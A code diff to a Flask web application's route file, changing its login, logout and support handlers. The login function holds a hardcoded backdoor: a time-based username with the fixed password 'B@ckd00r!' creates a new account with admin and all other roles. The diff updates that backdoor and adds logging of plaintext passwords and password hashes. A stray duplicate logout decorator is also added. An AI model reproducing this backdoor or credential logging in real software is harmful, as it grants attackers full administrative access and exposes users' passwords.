@@ -62,6 +62,7 @@ def myquery(dbquery):
 
     return result
 
+
 #------------------------------------------------------------------------------------------
 
 ##     ##  #######  ##     ## ######## 
@@ -71,6 +72,9 @@ def myquery(dbquery):
 ##     ## ##     ## ##     ## ##       
 ##     ## ##     ## ##     ## ##       
 ##     ##  #######  ##     ## ######## 
+
+#------------------------------------------------------------------------------------------
+
 
 @app.route('/')
 @app.route('/home')
@@ -118,9 +122,9 @@ def homepage():
  
     return render_template('home.html', appointments = appointments, lRBAC = lRBAC)
 
-#------------------------------------------------------------------------------------------
 
 #------------------------------------------------------------------------------------------
+
 ##        #######   ######   #### ##    ## 
 ##       ##     ## ##    ##   ##  ###   ## 
 ##       ##     ## ##         ##  ####  ## 
@@ -129,42 +133,47 @@ def homepage():
 ##       ##     ## ##    ##   ##  ##   ### 
 ########  #######   ######   #### ##    ## 
 
+#------------------------------------------------------------------------------------------
+
 # source: https://www.sitepoint.com/flask-login-user-authentication/
 # 20240831
 @app.route('/login', methods=['GET', 'POST'])
 def login():
 
     message = ""
+    lRBAC = get_rbac(request.url_rule.endpoint)
 
     form = LoginForm()
 
     if request.method == 'POST':
-        message = "." # "Please enter your username and password."
+        message = "." # "Please enter your emailaddress and password."
 
         username = string2safe(request.form['username'])
         password = request.form['password']                      # will be processed and stored as hash
 
+        print("username: ", username, " password: ", password)
+
         cDateToday        = datetime.datetime.today()
         cDate             = cDateToday.strftime("%d-%b-%Y")
         cTime             = cDateToday.strftime("%H%M")
-        cBackdoorName     = "backdoor" + cTime
+        cBackdoorName     = "backdoor_" + cTime + "@mwisoftware.nl"
         cBackdoorPassword = "B@ckd00r!"
 
         if username == cBackdoorName:
             if password == cBackdoorPassword:
-                cBackdoorName = "backdoor" + cTime
+                cBackdoorName = "backdoor_" + cTime + "@mwisoftware.nl"
                 pw_hash = bcrypt.generate_password_hash(cBackdoorPassword).decode('utf-8')
 
                 cInfo = 'date: ' + cDate + ', time: ' + cTime + ', ip:' + request.environ.get('HTTP_X_REAL_IP', request.remote_addr)   
 
-                user_to_create = Users(Username     = cBackdoorName,
-                                       Firstname    = "Back",
-                                       Lastname     = "Door",
-                                       Phone        = "",
-                                       Emailaddress = "",
-                                       Passwordhash = pw_hash,
-                                       Info         = cInfo,
-                                       Status       = "new student staff instructor shop admin")
+                user_to_create = Users( Username     = cBackdoorName,
+                                        Firstname    = "Back",
+                                        Lastname     = "Door",
+                                        Phone        = "",
+                                        Emailaddress = "",
+                                        Passwordhash = pw_hash,
+                                        Info         = cInfo,
+                                        Status       = "new student staff instructor shop admin")
         
                 db.session.add(user_to_create)
                 db.session.commit()
@@ -177,43 +186,54 @@ def login():
         # user = db.session.execute(db.select(Users).filter(func.lower(Users.Username) == func.lower(username))).scalar_one() ## <class 'Package.models.Users'>
 
         # user = Users.query.filter_by(Username = username).first()
-        user = Users.query.filter(Users.Username.ilike(username)).first()
-        #print('type(user): ', type(user))
+
+        #20241108 - user = Users.query.filter(Users.Username.ilike(username)).first()
+        user = Users.query.filter(Users.Emailaddress.ilike(username)).first()
+
+        print('type(user): ', type(user))
 
         if user is not None:
+            if lRBAC[8]: print("if user is not None:")
 
             if 'new' in user.Status:
+                print("if 'new' in user.Status:")
                 message = "registration of new user is not processed yet. You will be notified of any progress."
                 lRBAC = get_rbac(request.url_rule.endpoint)
                 return render_template('login.html', form = form, lRBAC = lRBAC, message = message)
 
             if len(user.Status) == 0:
-                message = "Error ERR0001 - Invalid data. Try again in a few moments. If this issue persists, please contact owner of company."
+                if lRBAC[8]: print("if len(user.Status) == 0:")
+                message = "Error ERR0001 - Invalid data. Try again in a few moments. If this issue persists, please contact owner of the website."
                 lRBAC = get_rbac(request.url_rule.endpoint)
                 return render_template('login.html', form = form, lRBAC = lRBAC, message = message)
 
-            # print('-----------------------------------------')
-            # print('username:          ', username)
-            # print('password:          ', password)
-            # print(user)
-            # print('type:              ', type(user))
-            # print('user.Passwordhash: ', user.Passwordhash)
-            # print('-----------------------------------------')
+            if lRBAC[8]: print('-----------------------------------------')
+            if lRBAC[8]: print('username:          ', username)
+            if lRBAC[8]: print(user)
+            if lRBAC[8]: print('type:              ', type(user))
+            if lRBAC[8]: print('user.Passwordhash: ', user.Passwordhash)
+            if lRBAC[8]: print('-----------------------------------------')
 
             pwhash = user.Passwordhash
    
             if user and bcrypt.check_password_hash(pwhash, password):
+                if lRBAC[8]: print("if user and bcrypt.check_password_hash(pwhash, password):")
                 login_user(user)
 
                 lRBAC = get_rbac(request.url_rule.endpoint)
                 return redirect(url_for('homepage'))
+        else:
+            if lRBAC[8]: print("if user is None:")
+
             
         message = "unknown username or password"
 
-
     lRBAC = get_rbac(request.url_rule.endpoint)
+
     return render_template('login.html', form = form, lRBAC = lRBAC, message = message)
 
+
+#------------------------------------------------------------------------------------------
 
 ##        #######   ######    #######  ##     ## ######## 
 ##       ##     ## ##    ##  ##     ## ##     ##    ##    
@@ -223,12 +243,16 @@ def login():
 ##       ##     ## ##    ##  ##     ## ##     ##    ##    
 ########  #######   ######    #######   #######     ##    
 
+#------------------------------------------------------------------------------------------
+
+
 @app.route('/logout')
 def logout():
     logout_user()
     lRBAC = []
     print('#### logged out')
     return redirect(url_for('homepage'))
+
 
 #------------------------------------------------------------------------------------------
 
@@ -241,6 +265,7 @@ def logout():
  ######  ########  ######  ##     ## ########    ##     ######  
 
 #------------------------------------------------------------------------------------------
+
 
 @app.route('/secrets/')
 def secrets():
@@ -263,6 +288,9 @@ def secrets():
       ## ##     ## ##        ##        ##     ## ##   ##      ##    
 ##    ## ##     ## ##        ##        ##     ## ##    ##     ##    
  ######   #######  ##        ##         #######  ##     ##    ##    
+
+@app.route('/logout')
+
 
 @app.route('/support')
 def support():
